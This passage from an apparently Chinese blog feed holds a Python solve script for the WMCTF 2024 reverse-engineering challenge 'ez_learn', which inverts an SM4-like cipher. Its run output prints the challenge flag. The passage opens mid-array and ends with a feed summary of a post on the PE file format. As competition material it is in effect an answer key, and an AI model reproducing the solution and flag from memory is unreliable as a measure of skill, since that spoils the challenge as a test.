class="number">0x18</span>, <span class="number">0xF0</span>, <span class="number">0x7D</span>, <span class="number">0xEC</span>, <span class="number">0x3A</span>, <span class="number">0xDC</span>, <span class="number">0x4D</span>, <span class="number">0x20</span>, <span class="number">0x79</span>, <span class="number">0xEE</span>, </span><br><span class="line">  <span class="number">0x5F</span>, <span class="number">0x3E</span>, <span class="number">0xD7</span>, <span class="number">0xCB</span>, <span class="number">0x39</span>, <span class="number">0x48</span>]</span><br><span class="line"></span><br><span class="line">arr1=[<span class="number">0x22313</span>,<span class="number">0x821DEF</span>,<span class="number">0x123128</span>,<span class="number">0x43434310</span>]</span><br><span class="line"></span><br><span class="line">init_arr=[-<span class="number">16426418</span>,</span><br><span class="line">  <span class="number">1386006122</span>,</span><br><span class="line">  <span class="number">417585731</span>,</span><br><span class="line">  <span class="number">73785572</span>,</span><br><span class="line">  -<span class="number">44516170</span>,</span><br><span class="line">  <span class="number">743348204</span>,</span><br><span class="line">  <span class="number">1218589880</span>,</span><br><span class="line">  -<span class="number">2077302440</span>,</span><br><span class="line">  <span class="number">2085988980</span>,</span><br><span class="line">  -<span class="number">1678820610</span>,</span><br><span class="line">  -<span class="number">2022048247</span>,</span><br><span class="line">  <span class="number">377860128</span>,</span><br><span class="line">  -<span class="number">1787215002</span>,</span><br><span class="line">  <span class="number">2059489311</span>,</span><br><span class="line">  <span class="number">2142295352</span>,</span><br><span class="line">  <span class="number">949488406</span>,</span><br><span class="line">  <span class="number">869497937</span>,</span><br><span class="line">  <span class="number">1605029019</span>,</span><br><span class="line">  -<span class="number">730639924</span>,</span><br><span class="line">  <span class="number">1221520050</span>,</span><br><span class="line">  <span class="number">2083086420</span>,</span><br><span class="line">  -<span class="number">245116433</span>,</span><br><span class="line">  <span class="number">232463943</span>,</span><br><span class="line">  -<span class="number">1650133145</span>,</span><br><span class="line">  -<span class="number">84626976</span>,</span><br><span class="line">  -<span class="number">61186127</span>,</span><br><span class="line">  -<span class="number">738273678</span>,</span><br><span class="line">  <span class="number">642456181</span>,</span><br><span class="line">  -<span class="number">274209084</span>,</span><br><span class="line">  -<span class="number">1800190812</span>,</span><br><span class="line">  -<span class="number">317114529</span>,</span><br><span class="line">  <span class="number">1487539437</span>]</span><br><span class="line"></span><br><span class="line">init_arr2=[<span class="number">0x4E</span>, <span class="number">0x5A</span>, <span class="number">0x05</span>, <span class="number">0xFF</span>, <span class="number">0x6A</span>, <span class="number">0xC6</span>, <span class="number">0x9C</span>, <span class="number">0x52</span>, <span class="number">0x43</span>, <span class="number">0xDA</span>, </span><br><span class="line">  <span class="number">0xE3</span>, <span class="number">0x18</span>, <span class="number">0xE4</span>, <span class="number">0xE0</span>, <span class="number">0x65</span>, <span class="number">0x04</span>, <span class="number">0xB6</span>, <span class="number">0xBC</span>, <span class="number">0x58</span>, <span class="number">0xFD</span>, </span><br><span class="line">  <span class="number">0xEC</span>, <span class="number">0x97</span>, <span class="number">0x4E</span>, <span class="number">0x2C</span>, <span class="number">0xB8</span>, <span class="number">0x34</span>, <span class="number">0xA2</span>, <span class="number">0x48</span>, <span class="number">0x58</span>, <span class="number">0xE1</span>, </span><br><span class="line">  <span class="number">0x2E</span>, <span class="number">0x84</span>, <span class="number">0x74</span>, <span class="number">0xAA</span>, <span class="number">0x55</span>, <span class="number">0x7C</span>, <span class="number">0xFE</span>, <span class="number">0x3A</span>, <span class="number">0xEF</span>, <span class="number">0x9B</span>, </span><br><span class="line">  <span class="number">0x09</span>, <span class="number">0xFE</span>, <span class="number">0x79</span>, <span class="number">0x87</span>, <span class="number">0x20</span>, <span class="number">0xB0</span>, <span class="number">0x85</span>, <span class="number">0x16</span>, <span class="number">0x66</span>, <span class="number">0x43</span>, </span><br><span class="line">  <span class="number">0x79</span>, <span class="number">0x95</span>, <span class="number">0x1F</span>, <span class="number">0x50</span>, <span class="number">0xC1</span>, <span class="number">0x7A</span>, <span class="number">0x38</span>, <span class="number">0xD5</span>, <span class="number">0xB0</span>, <span class="number">0x7F</span>, </span><br><span class="line">  <span class="number">0x16</span>, <span class="number">0x0B</span>, <span class="number">0x98</span>, <span class="number">0x38</span>, <span class="number">0x51</span>, <span class="number">0x7C</span>, <span class="number">0xD3</span>, <span class="number">0x33</span>, <span class="number">0x9B</span>, <span class="number">0xCC</span>, </span><br><span class="line">  <span class="number">0xAA</span>, <span class="number">0x5F</span>, <span class="number">0xCC</span>, <span class="number">0x51</span>, <span class="number">0x73</span>, <span class="number">0xD4</span>, <span class="number">0xB2</span>, <span class="number">0xEA</span>, <span class="number">0xCE</span>, <span class="number">0x48</span>, </span><br><span class="line">  <span class="number">0x54</span>, <span class="number">0x60</span>, <span class="number">0x29</span>, <span class="number">0x7C</span>, <span class="number">0xEF</span>, <span class="number">0xD1</span>, <span class="number">0x63</span>, <span class="number">0xF1</span>, <span class="number">0x47</span>, <span class="number">0x1E</span>, </span><br><span class="line">  <span class="number">0xDB</span>, <span class="number">0x0D</span>, <span class="number">0x67</span>, <span class="number">0xF7</span>, <span class="number">0xA4</span>, <span class="number">0x9D</span>, <span class="number">0xE0</span>, <span class="number">0xB1</span>, <span class="number">0xF4</span>, <span class="number">0xFA</span>, </span><br><span class="line">  <span class="number">0xB1</span>, <span class="number">0x5F</span>, <span class="number">0x5A</span>, <span class="number">0xFC</span>, <span class="number">0x72</span>, <span class="number">0xD6</span>, <span class="number">0xFE</span>, <span class="number">0xD3</span>, <span class="number">0x75</span>, <span class="number">0x1A</span>, </span><br><span class="line">  <span class="number">0x4B</span>, <span class="number">0x26</span>, <span class="number">0xC4</span>, <span class="number">0xE6</span>, <span class="number">0xA7</span>, <span class="number">0xEF</span>, <span class="number">0xA4</span>, <span class="number">0x44</span>, <span class="number">0xB3</span>, <span class="number">0x94</span>, </span><br><span class="line">  <span class="number">0x5F</span>, <span class="number">0x37</span>, <span class="number">0x19</span>, <span class="number">0xED</span>, <span class="number">0xED</span>, <span class="number">0x0C</span>, <span class="number">0xAA</span>, <span class="number">0x58</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sbox_sub</span>(<span class="params">x</span>):  <span class="comment">## 高4位寻址行，低4位寻址列</span></span><br><span class="line">    <span class="keyword">return</span> Sbox[<span class="number">16</span>*(x&gt;&gt;<span class="number">4</span>)+(x&amp;<span class="number">0xf</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">MyBitCalc</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> (((x&lt;&lt;<span class="number">24</span>)|(x&gt;&gt;<span class="number">8</span>)) ^ ((x&lt;&lt;<span class="number">18</span>)|(x&gt;&gt;<span class="number">14</span>)) ^ ((x&lt;&lt;<span class="number">10</span>)|(x&gt;&gt;<span class="number">22</span>)) ^ ((x&lt;&lt;<span class="number">2</span>)|(x&gt;&gt;<span class="number">30</span>)) ^ x) &amp; <span class="number">0xffffffff</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">result</span>):</span><br><span class="line">    input_flag = [<span class="number">0</span>]*<span class="number">36</span>;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        input_flag[<span class="number">35</span>-i]=result[i]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">31</span>,-<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">        idx = <span class="number">0x12121212</span> ^ input_flag[i+<span class="number">1</span>] ^ input_flag[i+<span class="number">2</span>] ^ input_flag[i+<span class="number">3</span>] ^ init_arr[i]</span><br><span class="line">        <span class="comment"># 字节寻址sbox</span></span><br><span class="line">        sub0 = sbox_sub(idx&amp;<span class="number">0xff</span>)</span><br><span class="line">        sub1 = sbox_sub((idx&gt;&gt;<span class="number">8</span>)&amp;<span class="number">0xff</span>)</span><br><span class="line">        sub2 = sbox_sub((idx&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xff</span>)</span><br><span class="line">        sub3 = sbox_sub((idx&gt;&gt;<span class="number">24</span>)&amp;<span class="number">0xff</span>)</span><br><span class="line">        sub = sub0 | (sub1&lt;&lt;<span class="number">8</span>) | (sub2&lt;&lt;<span class="number">16</span>) | (sub3&lt;&lt;<span class="number">24</span>)</span><br><span class="line">        input_flag[i]=MyBitCalc(sub)^<span class="number">0x34343434</span>^input_flag[i+<span class="number">4</span>]</span><br><span class="line"></span><br><span class="line">    flag = <span class="string">b&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        flag += pack(<span class="string">&quot;&lt;I&quot;</span>,input_flag[i])</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 动调导出前16字节加密后：</span></span><br><span class="line">result1 = [<span class="number">0xc676e86f</span>, <span class="number">0xad67e8f8</span>, <span class="number">0xca9db9ac</span>, <span class="number">0xb1ae068e</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 导出后16字节加密后：</span></span><br><span class="line">result2 = [<span class="number">0xD51B0298</span>, <span class="number">0xD827C6D3</span>,<span class="number">0x31A5A335</span>, <span class="number">0x893A7A66</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    decrypt(result1)</span><br><span class="line">    decrypt(result2)</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PS D:\BLOG\<span class="built_in">source</span>&gt; python -u <span class="string">&quot;d:\ctf\wmctf2024\re\ez_learn_d191751e6ada67ca536acd67e16793ca\exp.py&quot;</span></span><br><span class="line">b<span class="string">&#x27;WMCTF&#123;CRC32andAn&#x27;</span></span><br><span class="line">b<span class="string">&#x27;ti_IS_SO_EASY!!&#125;&#x27;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;PE 文件格式简析&lt;/h1&gt;
&lt;p&gt;相比于ELF，PE文件中包含了相当多的可读性非常强（更加直观）的信息。包括预设的程序加载基址0x400000, 导入导出表等等都是直接写明文字符串而且独立于section之外单独存储的。用010editor结合一个exe程序简单分析一下</summary>
      
    
    
    
    
    <category term="逆向" scheme="http://example.com/tags/%E9%80%86%E5%90%91/"/>
    
    <category term="Windows" scheme="http://example.com/tags/Windows/"/>
    
  </entry>
  
</feed>
